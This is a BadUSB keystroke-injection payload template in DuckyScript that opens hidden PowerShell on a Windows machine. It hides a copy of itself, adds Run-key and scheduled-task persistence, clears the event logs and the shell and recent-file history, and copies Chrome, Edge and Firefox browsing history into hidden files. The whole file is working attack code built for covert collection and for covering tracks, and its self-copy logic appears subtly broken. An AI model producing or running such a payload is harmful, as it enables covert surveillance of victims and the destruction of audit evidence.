REM ╔══════════════════════════════════════════════════════════════╗
REM ║  Browser History Dumper + Persistence                      ║
REM ║  Generated by Pen15 BadUSB Wizard                          ║
REM ║  Self-hiding, extracts Chrome/Edge/FF history on login     ║
REM ╚══════════════════════════════════════════════════════════════╝
REM  Target: {{computer_name}}

DELAY 1500
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000

REM ── Self-hide ──
STRING $hideDir = "$env:ProgramData\Microsoft\Windows\"
ENTER
STRING if (!(Test-Path $hideDir)) { New-Item -Path $hideDir -ItemType Directory -Force | Out-Null }
ENTER
STRING $myPath = $hideDir + "browser_svc.ps1"
ENTER
STRING if ($MyInvocation.MyCommand.Path -ne $myPath) {
ENTER
STRING   Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $myPath -Force
ENTER
STRING   Set-ItemProperty $myPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "BrowserSvc" /t REG_SZ /d "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /f 2>$null
ENTER
STRING   schtasks /create /tn "BrowserSvcTask" /tr "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /sc onlogon /f 2>$null
ENTER
STRING   Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING   Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
ENTER
STRING   wevtutil cl Security 2>$null; wevtutil cl System 2>$null; wevtutil cl Application 2>$null
ENTER
STRING   Start-Process powershell -ArgumentList "-w hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
ENTER
STRING   exit
ENTER
STRING }
ENTER

REM ── Copy browser databases ──
STRING $out = @()
ENTER
STRING $out += "=== BROWSER HISTORY: {{computer_name}} ==="
ENTER
STRING $out += "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
ENTER
STRING $out += ""
ENTER

REM ── Chrome ──
STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
ENTER
STRING if (Test-Path $chromePath) {
ENTER
STRING   $chromeCopy = "$hideDir\chrome_history.db"
ENTER
STRING   Copy-Item $chromePath $chromeCopy -Force
ENTER
STRING   Set-ItemProperty $chromeCopy -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING   $out += "Chrome: History copied to hidden location"
ENTER
STRING } else { $out += "Chrome: Not installed" }
ENTER

REM ── Edge ──
STRING $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
ENTER
STRING if (Test-Path $edgePath) {
ENTER
STRING   $edgeCopy = "$hideDir\edge_history.db"
ENTER
STRING   Copy-Item $edgePath $edgeCopy -Force
ENTER
STRING   Set-ItemProperty $edgeCopy -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING   $out += "Edge: History copied to hidden location"
ENTER
STRING } else { $out += "Edge: Not installed" }
ENTER

REM ── Firefox ──
STRING $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
ENTER
STRING if (Test-Path $ffPath) {
ENTER
STRING   $ffDb = Get-ChildItem "$ffPath\*\places.sqlite" -ErrorAction SilentlyContinue | Select-Object -First 1
ENTER
STRING   if ($ffDb) {
ENTER
STRING     $ffCopy = "$hideDir\firefox_history.db"
ENTER
STRING     Copy-Item $ffDb.FullName $ffCopy -Force
ENTER
STRING     Set-ItemProperty $ffCopy -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING     $out += "Firefox: History copied to hidden location"
ENTER
STRING   } else { $out += "Firefox: No profile found" }
ENTER
STRING } else { $out += "Firefox: Not installed" }
ENTER

STRING $out += ""
ENTER
STRING $out += "All browser databases saved to: $hideDir (hidden)"
ENTER
STRING $out += "=== END ==="
ENTER
STRING $outPath = "$hideDir\browser_report_{{computer_name}}.txt"
ENTER
STRING $out | Out-File $outPath -Encoding UTF8
ENTER
STRING Set-ItemProperty $outPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING notepad $outPath
ENTER
STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING exit
REM ══════════════════════════════════════════════════════════════
REM Browser history dumped — databases hidden in ProgramData
REM Persistence: auto-refreshes on every login
REM ══════════════════════════════════════════════════════════════
